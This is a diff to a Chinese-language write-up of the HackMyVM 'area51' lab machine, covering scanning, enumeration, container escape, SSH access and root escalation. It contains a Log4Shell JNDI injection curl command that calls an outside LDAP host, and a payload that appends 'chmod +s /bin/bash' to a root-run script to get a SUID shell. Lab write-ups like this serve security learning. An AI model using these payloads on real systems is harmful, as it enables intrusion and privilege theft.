@@ -3,12 +3,12 @@ title: area51
 tags:
   - sec/redteam
 date: 2024-04-16T19:27:27
-lastmod: 2024-11-24T18:56:07
+lastmod: 2024-11-24T19:10:29
 toc: "true"
 ---
 
 ## 主机发现
-```
+```bash
 ~/workspace sudo arp-scan -I ens33 -l
 Interface: ens33, type: EN10MB, MAC: 00:0c:29:a1:f0:49, IPv4: 192.168.89.15
 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
@@ -19,7 +19,7 @@ Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 
 
 ## 端口扫描
-```
+```bash
 ~/workspace sudo nmap 192.168.89.13 -Pn -sT -p- -A --min-rate=10000
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-16 07:34 EDT
 Nmap scan report for 192.168.89.13
@@ -54,7 +54,7 @@ Nmap done: 1 IP address (1 host up) scanned in 11.70 seconds
 
 ## web_80
 
-```
+```bash
 ~/workspace whatweb 192.168.89.13
 http://192.168.89.13 [200 OK] Apache[2.4.51], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.51 (Debian)], IP[192.168.89.13], JQuery[2.1.3], PasswordField, Script, Title[FBI Access]
 ~/workspace whatweb 192.168.89.13:8080
@@ -66,7 +66,7 @@ http://192.168.89.13:8080 [400 Bad Request] Country[RESERVED][ZZ], IP[192.168.89
 进去是个登录窗口, 随便输入个凭据, 点击登录. 没有数据包发出去
 ![HMV_area51_image_2](https://img.l1uyun.one/HMV_area51_image_2.png)
 就是个js
-```
+```bash
 var working = false;
 $('.login').on('submit', function(e) {
   e.preventDefault();
@@ -117,8 +117,7 @@ Starting gobuster in directory enumeration mode
 ```
 
 
-```
-
+```bash
 ~/workspace curl 192.168.89.13/note.txt
 Alert!
 We have a vulnerability in our java application...
@@ -193,7 +192,7 @@ amazing
 
 进去之后是docker环境. 需要逃逸一下
 ![HMV_area51_image_9](https://img.l1uyun.one/HMV_area51_image_9.png)
-```
+```bash
 ip a
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
@@ -210,7 +209,7 @@ ip a
 
 接触到了一个新的工具, fscan, 常见的内网扫描工具
 
-```
+```bash
 ./fscan -h 172.17.0.2/16
 
    ___                              _
@@ -236,13 +235,13 @@ start vulscan
 [*] WebTitle http://172.17.0.2:8080    code:400 len:277    title:None
 ```
 
-```
+```bash
 curl http://172.17.0.1:8080 -H 'X-Api Version:${jndi:ldap://192.168.68.99:1389/a}'
 ```
 好吧, 这样子好像不行, 之后回过来想想
 
 ## 枚举
-```
+```bash
 cd /var/tmp
 ls -al
 total 16
@@ -254,7 +253,7 @@ b3st4l13n
 ```
 
 ## ssh登录靶机
-```
+```bash
 roger@area51:~$ ls -al
 total 36
 drwxr-xr-x 3 roger roger 4096 Dec 21  2021 .
@@ -303,7 +302,7 @@ roger@area51:~$
 ```
 
 ## 枚举
-```
+```bash
 roger@area51:/opt$ find / -type f -name ".*" 2>/dev/null | grep -v  sys
 /etc/skel/.bash_logout
 /etc/skel/.profile
@@ -324,7 +323,7 @@ roger@area51:/opt$
 ```
 
 
-```
+```bash
 roger@area51:/etc/skel$ cat /etc/passwd | grep bash
 root:x:0:0:root:/root:/bin/bash
 roger:x:1001:1001:,,,:/home/roger:/bin/bash
@@ -337,7 +336,7 @@ roger@area51:/etc/skel$
 ```
 
 ## 横向移动
-```
+```bash
 kang@area51:~$ ls -al
 total 16
 drwxrwx---  3 kang kang 4096 Apr 19 22:56 .
@@ -352,7 +351,7 @@ weComeInPeace. sh这个文件有时出现有时没有........... 这肯定是key
 
 ## 利用定时任务提权
 上pspy试试,有个script. sh
-```
+```bash
 2024/04/19 22:58:18 CMD: UID=0     PID=1      | /sbin/init
 2024/04/19 22:58:18 CMD: UID=0     PID=7132   | /bin/sh /root/script.sh
 2024/04/19 22:58:18 CMD: UID=0     PID=7133   | sleep 1
@@ -361,18 +360,19 @@ weComeInPeace. sh这个文件有时出现有时没有........... 这肯定是key
 2024/04/19 22:58:21 CMD: UID=0     PID=7136   | /bin/sh /root/script.sh
 ```
 
-amazing this /bin/bash 2 suid 
-i just run 
+
+使用下面的payload
+
 `for i in {1..10000}; do echo 'chmod +s /bin/bash' >> weComeInPeace.sh; done`
-try write something to  strange file in kang\`s home directory
+
 
 然后就获得了suid的bash
-```
+```bash
 bash-5.1# ls -al /bin/bash
 -rwsr-sr-x 1 root root 1234376 Aug  4  2021 /bin/bash
 ```
 ## root
-```
+```bash
 bash-5.1# cd /root
 bash-5.1# ls -al
 total 28
@@ -434,8 +434,4 @@ done
 bash-5.1#
 ```
 
-something stranges
 
-
-
-![HMV_area51_image_10](https://img.l1uyun.one/HMV_area51_image_10.png)
